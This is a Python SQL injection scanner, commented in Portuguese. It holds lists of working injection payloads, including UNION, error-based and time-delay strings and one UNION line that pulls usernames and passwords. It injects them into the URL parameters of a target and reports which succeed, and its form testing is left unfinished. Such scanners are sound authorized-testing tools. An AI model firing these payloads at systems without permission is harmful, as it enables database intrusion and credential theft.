#!/usr/bin/env python3
"""
SQL Injection Detector
Ferramenta para detecção de vulnerabilidades SQL Injection.
"""

import re
import time
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress

console = Console()


# Payloads para diferentes técnicas
PAYLOADS = {
    "generic": [
        "'", '"', "'", "''", '""', "` ",
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
        '" OR "1"="1', '" OR "1"="1"--',
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "admin'--", "admin'#", "') OR ('1'='1",
        "1' ORDER BY 1--", "1' ORDER BY 10--",
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
    ],
    "error_based": [
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=1 AND '%'='",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(5000000,SHA1('test'))--",
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    "blind_boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "' AND substring(username,1,1)='a",
    ]
}

# Padrões de erro SQL
SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.* SQL[-_ ]*Server",
    r"OLE DB.* SQL Server",
    r"SQLServer JDBC Driver",
    r"Microsoft SQL Native Client",
    r"ODBC SQL Server Driver",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_",
    r"Warning.*SQLite3::",
    r"ORA-\d{5}",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*oci_",
    r"Warning.*ora_",
]


@dataclass
class SQLiResult:
    """Resultado de detecção de SQLi."""
    url: str
    parameter: str
    payload: str
    technique: str
    confidence: str
    evidence: str


class SQLiDetector:
    """Detector de SQL Injection."""
    
    def __init__(self, timeout: int = 10, threads: int = 5):
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Security Scanner)"
        self.results: List[SQLiResult] = []
    
    def _make_request(self, url: str, method: str = "GET", data: Dict = None) -> Tuple[Optional[str], float]:
        """Faz requisição e retorna conteúdo e tempo."""
        try:
            start = time.time()
            if method == "GET":
                response = self.session.get(url, timeout=self.timeout)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout)
            elapsed = time.time() - start
            return response.text, elapsed
        except Exception:
            return None, 0
    
    def _check_sql_errors(self, content: str) -> Optional[str]:
        """Verifica se há erros SQL na resposta."""
        for pattern in SQL_ERRORS:
            if re.search(pattern, content, re.IGNORECASE):
                return pattern
        return None
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Injeta payload no parâmetro da URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param in params:
            params[param] = [params[param][0] + payload]
        else:
            params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    
    def test_error_based(self, url: str, param: str) -> Optional[SQLiResult]:
        """Testa SQL Injection baseado em erro."""
        for payload in PAYLOADS["generic"] + PAYLOADS["error_based"]:
            test_url = self._inject_payload(url, param, payload)
            content, _ = self._make_request(test_url)
            
            if content:
                error = self._check_sql_errors(content)
                if error:
                    return SQLiResult(
                        url=url,
                        parameter=param,
                        payload=payload,
                        technique="Error-based",
                        confidence="High",
                        evidence=error
                    )
        return None
    
    def test_blind_boolean(self, url: str, param: str) -> Optional[SQLiResult]:
        """Testa Blind SQL Injection (Boolean-based)."""
        # Requisição base
        base_content, _ = self._make_request(url)
        if not base_content:
            return None
        
        # True condition
        true_url = self._inject_payload(url, param, "' AND 1=1--")
        true_content, _ = self._make_request(true_url)
        
        # False condition
        false_url = self._inject_payload(url, param, "' AND 1=2--")
        false_content, _ = self._make_request(false_url)
        
        if true_content and false_content:
            # Se as respostas são significativamente diferentes
            if len(true_content) != len(false_content) and abs(len(true_content) - len(false_content)) > 50:
                return SQLiResult(
                    url=url,
                    parameter=param,
                    payload="' AND 1=1-- / ' AND 1=2--",
                    technique="Blind Boolean",
                    confidence="Medium",
                    evidence=f"Response diff: {abs(len(true_content) - len(false_content))} bytes"
                )
        return None
    
    def test_time_based(self, url: str, param: str, delay: int = 5) -> Optional[SQLiResult]:
        """Testa Time-based Blind SQL Injection."""
        # Baseline
        _, base_time = self._make_request(url)
        
        for payload in PAYLOADS["time_based"]:
            test_url = self._inject_payload(url, param, payload.replace("5", str(delay)))
            _, elapsed = self._make_request(test_url)
            
            # Se o tempo de resposta aumentou significativamente
            if elapsed >= delay - 1:
                return SQLiResult(
                    url=url,
                    parameter=param,
                    payload=payload,
                    technique="Time-based Blind",
                    confidence="High",
                    evidence=f"Response time: {elapsed:.2f}s (expected ~{delay}s)"
                )
        return None
    
    def extract_forms(self, url: str) -> List[Dict]:
        """Extrai formulários da página."""
        content, _ = self._make_request(url)
        if not content:
            return []
        
        soup = BeautifulSoup(content, "html.parser")
        forms = []
        
        for form in soup.find_all("form"):
            form_data = {
                "action": form.get("action", ""),
                "method": form.get("method", "GET").upper(),
                "inputs": []
            }
            
            for inp in form.find_all(["input", "textarea", "select"]):
                input_data = {
                    "name": inp.get("name", ""),
                    "type": inp.get("type", "text"),
                    "value": inp.get("value", "")
                }
                if input_data["name"]:
                    form_data["inputs"].append(input_data)
            
            forms.append(form_data)
        
        return forms
    
    def scan(self, url: str, test_forms: bool = False) -> List[SQLiResult]:
        """Executa scan completo."""
        console.print(f"\n[bold cyan]🔍 Scanning {url}[/bold cyan]\n")
        
        # Extrair parâmetros da URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            console.print("[yellow]⚠️ Nenhum parâmetro encontrado na URL[/yellow]")
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Testando parâmetros...", total=len(params) * 3)
            
            for param in params:
                # Teste Error-based
                result = self.test_error_based(url, param)
                if result:
                    self.results.append(result)
                progress.advance(task)
                
                # Teste Boolean-based
                result = self.test_blind_boolean(url, param)
                if result:
                    self.results.append(result)
                progress.advance(task)
                
                # Teste Time-based
                result = self.test_time_based(url, param)
                if result:
                    self.results.append(result)
                progress.advance(task)
        
        # Testar formulários
        if test_forms:
            forms = self.extract_forms(url)
            console.print(f"[cyan]📝 Encontrados {len(forms)} formulários[/cyan]")
            # Adicionar lógica de teste de forms
        
        return self.results
    
    def print_results(self):
        """Imprime resultados encontrados."""
        if not self.results:
            console.print("\n[green]✅ Nenhuma vulnerabilidade SQL Injection encontrada![/green]")
            return
        
        table = Table(title="\n🚨 Vulnerabilidades SQL Injection Encontradas")
        table.add_column("Parâmetro", style="cyan")
        table.add_column("Técnica", style="yellow")
        table.add_column("Confiança", style="bold")
        table.add_column("Payload")
        table.add_column("Evidência")
        
        for r in self.results:
            conf_style = "red" if r.confidence == "High" else "yellow"
            table.add_row(
                r.parameter,
                r.technique,
                f"[{conf_style}]{r.confidence}[/{conf_style}]",
                r.payload[:30] + "..." if len(r.payload) > 30 else r.payload,
                r.evidence[:40]
            )
        
        console.print(table)
        console.print(f"\n[red]⚠️ Total: {len(self.results)} vulnerabilidades encontradas![/red]")


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Detector")
    parser.add_argument("--url", "-u", required=True, help="URL alvo")
    parser.add_argument("--forms", "-f", action="store_true", help="Testar formulários")
    parser.add_argument("--full", action="store_true", help="Scan completo")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout")
    parser.add_argument("--threads", type=int, default=5, help="Threads")
    
    args = parser.parse_args()
    
    detector = SQLiDetector(timeout=args.timeout, threads=args.threads)
    detector.scan(args.url, test_forms=args.forms)
    detector.print_results()
    
    # Exit code
    high_conf = len([r for r in detector.results if r.confidence == "High"])
    exit(1 if high_conf > 0 else 0)


if __name__ == "__main__":
    main()
